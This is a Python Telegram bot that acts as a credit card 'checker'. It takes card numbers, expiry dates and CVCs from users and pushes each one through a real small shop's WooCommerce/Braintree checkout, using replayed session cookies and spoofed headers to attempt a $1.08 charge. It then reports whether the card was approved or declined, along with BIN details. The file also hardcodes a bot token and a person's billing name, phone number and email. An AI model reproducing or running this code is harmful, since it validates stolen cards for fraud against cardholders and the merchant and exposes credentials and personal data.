import requests
import time
import re
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Bot token - Replace with your actual bot token
BOT_TOKEN = "8474486600:AAHIqGOVZHFcEJx4GYxQTJTSqpLb5kjER2o"

def load_cookies_from_file(filename='cookies.txt'):
    """Load cookies from external file"""
    cookies = {}
    try:
        with open(filename, 'r') as f:
            for line in f:
                line = line.strip()
                if line and '=' in line and not line.startswith('#'):
                    key, value = line.split('=', 1)
                    cookies[key.strip()] = value.strip()
        print(f"✅ Loaded {len(cookies)} cookies from {filename}")
        return cookies
    except FileNotFoundError:
        print(f"❌ Cookie file {filename} not found. Using default cookies.")
        # Fallback to default cookies if file doesn't exist
        return {
            '_fbp': 'fb.1.1760871533342.823843399900255955',
            'woocommerce_items_in_cart': '1',
            'woocommerce_cart_hash': '889cc450f69e6933d2e30aec095d42e8',
            'wp_woocommerce_session_66d51b3d86bb8ddf71b26d7baaf82cfe': 't_e5abaccb078cb251edbc4d76ec2b58%7C1761044351%7C1760957951%7C%24generic%24QruAVx4z8PBXW1Ii26l0aILX1yUd7apbzadYX8S8',
            'sbjs_migrations': '1418474375998%3D1',
            'sbjs_current_add': 'fd%3D2025-10-19%2011%3A02%3A11%7C%7C%7Cep%3Dhttps%3A%2F%2Fprecisionpowdertx.com%2Fcart%2F%3Fproduct_added_to_cart%3D207%26quantity%3D1%7C%7C%7Crf%3Dhttps%3A%2F%2Fprecisionpowdertx.com%2Fshop%2Ftest-colster%2F',
            'sbjs_first_add': 'fd%3D2025-10-19%2011%3A02%3A11%7C%7C%7Cep%3Dhttps%3A%2F%2Fprecisionpowdertx.com%2Fcart%2F%3Fproduct_added_to_cart%3D207%26quantity%3D1%7C%7C%7Crf%3Dhttps%3A%2F%2Fprecisionpowdertx.com%2Fshop%2Ftest-colster%2F',
            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F141.0.0.0%20Safari%2F537.36',
            'pys_session_limit': 'true',
            'pys_start_session': 'true',
            'pys_first_visit': 'true',
            'pysTrafficSource': 'direct',
            'pys_landing_page': 'https://precisionpowdertx.com/cart/',
            'last_pysTrafficSource': 'direct',
            'last_pys_landing_page': 'https://precisionpowdertx.com/cart/',
            '_gid': 'GA1.2.725883759.1760871747',
            '_tccl_visitor': 'e71e7411-b0d7-489f-9ef9-41d30aba7672',
            '_tccl_visit': 'e71e7411-b0d7-489f-9ef9-41d30aba7672',
            'pbid': '090d4ee59a8b1be98001cc747f7004ab4a94d05e60fdbfb8a0a3555530b7d88e',
            '_ga_TLJD19XVK9': 'GS2.1.s1760871531$o1$g1$t1760873665$j60$l0$h0',
            'sbjs_session': 'pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fprecisionpowdertx.com%2Fcheckout%2F',
            '_scc_session': 'pc=4&C_TOUCH=2025-10-19T11:34:26.430Z',
            '_ga': 'GA1.2.1954184736.1760871531',
            '_ga_F1N3YC0JMG': 'GS2.2.s1760871751$o1$g1$t1760873666$j60$l0$h0',
        }
    except Exception as e:
        print(f"❌ Error loading cookies from {filename}: {str(e)}")
        return {}

# Load cookies from external file
PRECISION_COOKIES = load_cookies_from_file('cookies.txt')

PRECISION_HEADERS = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://precisionpowdertx.com',
    'priority': 'u=1, i',
    'referer': 'https://precisionpowdertx.com/checkout/',
    'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

def check_card_braintree(card_number, exp_month, exp_year, cvc):
    """Check credit card using Precision Powder TX site's Braintree integration"""
    try:
        # Determine card type based on first digit
        card_type = "visa" if card_number.startswith('4') else "mastercard" if card_number.startswith('5') else "amex" if card_number.startswith('3') else "discover"
        
        # Prepare checkout data for Braintree
        checkout_data = {
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': 'https%3A%2F%2Fprecisionpowdertx.com%2Fshop%2Ftest-colster%2F',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': 'https%3A%2F%2Fprecisionpowdertx.com%2Fcart%2F%3Fproduct_added_to_cart%3D207%26quantity%3D1',
            'wc_order_attribution_session_start_time': '2025-10-19+11%3A02%3A11',
            'wc_order_attribution_session_pages': '5',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': 'Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F141.0.0.0+Safari%2F537.36',
            'billing_first_name': 'ZE',
            'billing_last_name': 'TECH',
            'billing_company': 'zetechuni',
            'billing_country': 'US',
            'billing_address_1': 'Zetech+uni%2C+Ruiru+-+Kiambu+County-+KENYA',
            'billing_address_2': '',
            'billing_city': 'RUIRU',
            'billing_state': 'TX',
            'billing_postcode': '76148',
            'billing_phone': '%2B254705301302',
            'billing_email': 'maxwellirungu64%40gmail.com',
            'account_password': '',
            'shipping_first_name': 'ZE',
            'shipping_last_name': 'TECH',
            'shipping_company': 'zetechuni',
            'shipping_country': 'US',
            'shipping_address_1': '',
            'shipping_address_2': '',
            'shipping_city': 'Watauga',
            'shipping_state': 'TX',
            'shipping_postcode': '76148',
            'order_comments': '',
            'shipping_method[0]': 'local_pickup%3A1',
            'payment_method': 'braintree_credit_card',
            'wc-braintree-credit-card-card-type': card_type,
            'wc-braintree-credit-card-3d-secure-enabled': '',
            'wc-braintree-credit-card-3d-secure-verified': '0',
            'wc-braintree-credit-card-3d-secure-order-total': '1.08',
            'wc_braintree_credit_card_payment_nonce': f'tokencc_bh_{card_number[-4:]}_{exp_month}{exp_year}_{cvc}_test',
            'wc_braintree_device_data': '',
            'terms': 'on',
            'terms-field': '1',
            'woocommerce-process-checkout-nonce': 'd65cfe3a0b',
            '_wp_http_referer': '%2F%3Fwc-ajax%3Dupdate_order_review',
            'pys_utm': 'utm_source%3Aundefined%7Cutm_medium%3Aundefined%7Cutm_campaign%3Aundefined%7Cutm_term%3Aundefined%7Cutm_content%3Aundefined',
            'pys_utm_id': 'fbadid%3Aundefined%7Cgadid%3Aundefined%7Cpadid%3Aundefined%7Cbingid%3Aundefined',
            'pys_browser_time': '14-15%7CSunday%7COctober',
            'pys_landing': 'https%3A%2F%2Fprecisionpowdertx.com%2Fcart%2F',
            'pys_source': 'direct',
            'pys_order_type': 'normal',
            'last_pys_landing': 'https%3A%2F%2Fprecisionpowdertx.com%2Fcart%2F',
            'last_pys_source': 'direct',
            'last_pys_utm': 'utm_source%3Aundefined%7Cutm_medium%3Aundefined%7Cutm_campaign%3Aundefined%7Cutm_term%3Aundefined%7Cutm_content%3Aundefined',
            'last_pys_utm_id': 'fbadid%3Aundefined%7Cgadid%3Aundefined%7Cpadid%3Aundefined%7Cbingid%3Aundefined'
        }
        
        # Convert to URL-encoded string
        data_string = '&'.join([f'{key}={value}' for key, value in checkout_data.items()])
        
        # Make request to Precision Powder TX checkout
        response = requests.post(
            'https://precisionpowdertx.com/',
            params={'wc-ajax': 'checkout'},
            cookies=PRECISION_COOKIES,
            headers=PRECISION_HEADERS,
            data=data_string
        )
        
        if response.status_code == 200:
            try:
                result_json = response.json()
                
                # Debug: Print the full JSON response for troubleshooting
                print(f"Braintree Response JSON: {result_json}")
                
                # Check for success/failure
                if result_json.get('result') == 'success':
                    return "Charged $1.08 - Payment successful"
                elif result_json.get('result') == 'failure':
                    messages = result_json.get('messages', '')
                    
                    # Extract error message from HTML
                    if 'declined' in messages.lower():
                        return "Declined - The provided card was declined, please use an alternate card or other form of payment"
                    elif 'insufficient' in messages.lower():
                        return "Declined - Insufficient funds"
                    elif 'expired' in messages.lower():
                        return "Declined - Card expired"
                    elif 'invalid' in messages.lower():
                        return "Declined - Invalid card"
                    else:
                        # Clean HTML tags and return the message
                        clean_message = re.sub(r'<[^>]+>', '', messages).strip()
                        return f"Declined - {clean_message}"
                else:
                    return "Error - Unknown response format"
                    
            except Exception as e:
                return f"Error - Invalid response: {str(e)}"
        else:
            return f"Error - Server error (Status: {response.status_code})"
            
    except Exception as e:
        return f"Error - {str(e)}"

def get_bin_info(card_number):
    """Get BIN information from antipublic.cc API"""
    try:
        data = requests.get('https://bins.antipublic.cc/bins/' + card_number[:6]).json()
    except Exception as e:
        data = {}  # If BIN API fails, use empty data
    
    brand = data.get('brand', 'Unknown')
    card_type = data.get('type', 'Unknown')
    country = data.get('country_name', 'Unknown')
    country_flag = data.get('country_flag', '🏳️')
    bank = data.get('bank', 'Unknown')
    
    return {
        'brand': brand,
        'type': card_type,
        'country': country,
        'flag': country_flag,
        'bank': bank
    }

def parse_card_input(text):
    """Parse card input in format: 41659840163XXXXX|03|27|150"""
    try:
        parts = text.split('|')
        if len(parts) != 4:
            return None
        
        card_number = parts[0].replace(' ', '').replace('-', '')
        exp_month = parts[1].zfill(2)
        exp_year = parts[2]
        cvc = parts[3]
        
        # Validate card number length
        if len(card_number) < 13 or len(card_number) > 19:
            return None
            
        return {
            'number': card_number,
            'month': exp_month,
            'year': exp_year,
            'cvc': cvc
        }
    except:
        return None

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    await update.message.reply_text(
        "🔐 <b>Braintree Credit Card Checker Bot</b>\n\n"
        "Send me a credit card in this format:\n"
        "<code>/br 41659840163XXXXX|03|27|150</code>\n\n"
        "Or just send the card details directly!\n\n"
        "<b>Bot by:</b> @Rar_Xd",
        parse_mode='HTML'
    )

async def br_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /br command for Braintree card checking"""
    if not context.args:
        await update.message.reply_text(
            "❌ <b>Invalid Format!</b>\n\n"
            "Use: <code>/br 41659840163XXXXX|03|27|150</code>",
            parse_mode='HTML'
        )
        return
    
    card_input = ' '.join(context.args)
    await check_card_command(update, context, card_input)

async def check_card_command(update: Update, context: ContextTypes.DEFAULT_TYPE, card_input=None):
    """Main card checking function"""
    if card_input is None:
        card_input = update.message.text
    
    # Parse card input
    card_data = parse_card_input(card_input)
    if not card_data:
        await update.message.reply_text(
            "❌ <b>Invalid Card Format!</b>\n\n"
            "Please use format: <code>41659840163XXXXX|03|27|150</code>\n"
            "Or: <code>/br 41659840163XXXXX|03|27|150</code>",
            parse_mode='HTML'
        )
        return
    
    # Send processing message
    processing_msg = await update.message.reply_text("🔄 <b>Checking card...</b>", parse_mode='HTML')
    
    start_time = time.time()
    
    # Check card using Braintree
    result = check_card_braintree(
        card_data['number'],
        card_data['month'],
        card_data['year'],
        card_data['cvc']
    )
    
    # Get BIN info
    bin_info = get_bin_info(card_data['number'])
    
    end_time = time.time()
    execution_time = end_time - start_time
    
    # Format response message
    cc = card_data['number']
    gate = "Precision Powder TX (Braintree)"
    last = result
    
    # Determine status emoji and title based on result
    if "Charged $1.08" in result and "successful" in result:
        status_emoji = "✅"
        status_title = "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙"
    elif "declined" in result.lower() or "insufficient" in result.lower() or "expired" in result.lower() or "invalid" in result.lower():
        status_emoji = "❌"
        status_title = "𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙"
    else:
        status_emoji = "⚠️"
        status_title = "𝙀𝙧𝙧𝙤𝙧"
    
    # Format card details
    full_card = f"{cc}|{card_data['month']}|{card_data['year']}|{card_data['cvc']}"
    
    msg = f'''<b>{status_emoji} {status_title} {status_emoji}</b>	   
<b>[↯] 𝗖𝗖 ⇾</b> <code>{full_card}</code>
<b>[↯] 𝗚𝗔𝗧𝗘𝗦 ⇾</b> {gate}
<b>[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →</b> {last}
<b>[↯] 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 ⇾</b> $1.08
<b>[↯] 𝗕𝗜𝗡 →</b> {cc[:6]} - {bin_info['type']} - {bin_info['brand']}
<b>[↯] 𝗕𝗮𝗻𝗸 →</b> {bin_info['bank']}
<b>[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 →</b> {bin_info['country']} {bin_info['flag']}
<b>[↯] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾</b> {"{:.1f}".format(execution_time)} seconds.
<b>𝗕𝗼𝘁 𝗕𝘆 ⇾</b> @manrsx'''
    
    # Edit the processing message with results
    await processing_msg.edit_text(msg, parse_mode='HTML')

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle regular messages"""
    message_text = update.message.text
    
    # Check if message contains card pattern
    if '|' in message_text and len(message_text.split('|')) == 4:
        await check_card_command(update, context, message_text)
    else:
        await update.message.reply_text(
            "❌ <b>Invalid Format!</b>\n\n"
            "Please send card in format: <code>41659840163XXXXX|03|27|150</code>\n"
            "Or use: <code>/br 41659840163XXXXX|03|27|150</code>",
            parse_mode='HTML'
        )

def main():
    """Start the bot"""
    print("🤖 Starting Braintree Credit Card Checker Bot...")
    print("📡 Bot will use Precision Powder TX site for authentic Braintree responses")
    
    # Create application with minimal configuration to avoid compatibility issues
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("br", br_command))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    # Start bot
    print("✅ Bot Started Successfully!")
    print("🔗 Bot is now running and ready to check cards via Braintree!")
    application.run_polling()

if __name__ == '__main__':
    main()
